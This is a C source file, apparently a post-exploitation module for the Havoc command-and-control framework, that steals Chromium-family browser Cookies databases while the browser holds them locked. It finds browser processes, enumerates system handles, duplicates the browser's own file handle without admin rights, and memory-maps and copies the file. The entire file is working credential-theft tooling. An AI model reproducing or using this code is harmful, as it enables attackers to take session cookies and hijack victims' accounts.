/* bd_locked.c - read a file held with dwShareMode=0 (Chromium's
 * PRAGMA locking_mode=EXCLUSIVE on Cookies) by duplicating the browser's own
 * file handle and reading the contents via a memory-mapped view.
 *
 * Port of HackBrowserData rfcs/009-windows-locked-file-bypass.md. No admin.
 *
 * Optimization vs the naive RFC walk: we only scan handles owned by browser
 * processes (the lock holder) instead of every handle on the system, because
 * GetFinalPathNameByHandleA blocks on pipes/network handles owned by other
 * processes.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
/* tlhelp32.h declares the toolhelp APIs WITHOUT dllimport, which makes the
 * DFR macro emit bare externs (KERNEL32$Func, no __imp_) that Havoc's
 * CoffeeLdr cannot resolve. Declare them here with __declspec(dllimport) so
 * the DFR header's KERNEL32$ aliasing produces __imp_KERNEL32$Func. */
#include "bd.h"

#define TH32CS_SNAPPROCESS 0x00000002

typedef struct tagPROCESSENTRY32 {
    DWORD     dwSize;
    DWORD     cntUsage;
    DWORD     th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD     th32ModuleID;
    DWORD     cntThreads;
    DWORD     th32ParentProcessID;
    LONG      pcPriClassBase;
    DWORD     dwFlags;
    CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;

__declspec(dllimport) HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
__declspec(dllimport) BOOL   WINAPI Process32First(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
__declspec(dllimport) BOOL   WINAPI Process32Next(HANDLE hSnapshot, PROCESSENTRY32 *lppe);

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _stricmp(const char *, const char *);

typedef struct {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYS_HANDLE_ENTRY_EX;

typedef struct {
    ULONG_PTR          NumberOfHandles;
    ULONG_PTR          Reserved;
    SYS_HANDLE_ENTRY_EX Handles[1];
} SYS_HANDLE_INFO_EX;

#define SystemExtendedHandleInformation 64
typedef LONG (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

static char *normalize_path(const char *w) {
    if (w[0] == '\\' && w[1] == '\\' && w[2] == '?' && w[3] == '\\')
        return (char *)w + 4;
    return (char *)w;
}

static const char *g_browser_exes[] = {
    "msedge.exe", "chrome.exe", "brave.exe", "chromium.exe", "browser.exe",
    "opera.exe", "vivaldi.exe", "avastbrowser.exe", "coccoc.exe", NULL
};

static int is_browser(const char *name) {
    int i;
    for (i = 0; g_browser_exes[i]; i++)
        if (_stricmp(name, g_browser_exes[i]) == 0) return 1;
    return 0;
}

/* scan one process's handles for the locked file; copy if found */
static int scan_process(DWORD pid, const char *src, const char *dst) {
    HANDLE proc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    HMODULE ntdll;
    pNtQuerySystemInformation fnQuery;
    SYS_HANDLE_INFO_EX *buf = NULL;
    ULONG need = 0, bufsz = 2 * 1024 * 1024, i;
    int rc = -1;
    DWORD t0;

    if (!proc) return -1;
    ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) { CloseHandle(proc); return -1; }
    fnQuery = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!fnQuery) { CloseHandle(proc); return -1; }

    for (;;) {
        buf = (SYS_HANDLE_INFO_EX *)malloc(bufsz);
        if (!buf) { CloseHandle(proc); return -1; }
        need = 0;
        if (fnQuery(SystemExtendedHandleInformation, buf, bufsz, &need) == 0) break;
        free(buf); buf = NULL;
        if (bufsz >= 64 * 1024 * 1024) { CloseHandle(proc); return -1; }
        bufsz *= 2;
    }

    t0 = GetTickCount();
    for (i = 0; i < (ULONG)buf->NumberOfHandles; i++) {
        SYS_HANDLE_ENTRY_EX *e = &buf->Handles[i];
        HANDLE dup = NULL;
        char fname[600];
        DWORD fnlen;
        /* bounded: degrade to "not available" rather than wedge the run */
        if (GetTickCount() - t0 > 6000) break;
        if (e->UniqueProcessId != (ULONG_PTR)pid) continue;
        if (!DuplicateHandle(proc, (HANDLE)e->HandleValue, GetCurrentProcess(), &dup,
                             0, FALSE, DUPLICATE_SAME_ACCESS) || !dup)
            continue;
        if (GetFileType(dup) == FILE_TYPE_DISK) {
            fnlen = GetFinalPathNameByHandleA(dup, fname, sizeof(fname), 0);
            if (fnlen && fnlen < sizeof(fname) &&
                _stricmp(normalize_path(fname), src) == 0) {
                HANDLE map = CreateFileMappingW(dup, NULL, PAGE_READONLY, 0, 0, NULL);
                if (map) {
                    LPVOID view = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
                    if (view) {
                        DWORD sz = GetFileSize(dup, NULL);
                        if (sz != INVALID_FILE_SIZE && sz > 0 && sz < 256 * 1024 * 1024 &&
                            bd_write_file(dst, (const char *)view, sz) == 0)
                            rc = 0;
                        UnmapViewOfFile(view);
                    }
                    CloseHandle(map);
                }
                CloseHandle(dup);
                break;
            }
        }
        CloseHandle(dup);
    }
    free(buf);
    CloseHandle(proc);
    return rc;
}

int bd_copy_locked_file(const char *src, const char *dst) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    if (snap == INVALID_HANDLE_VALUE) return -1;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (is_browser(pe.szExeFile)) {
                if (scan_process(pe.th32ProcessID, src, dst) == 0) {
                    CloseHandle(snap);
                    return 0;
                }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return -1;
}
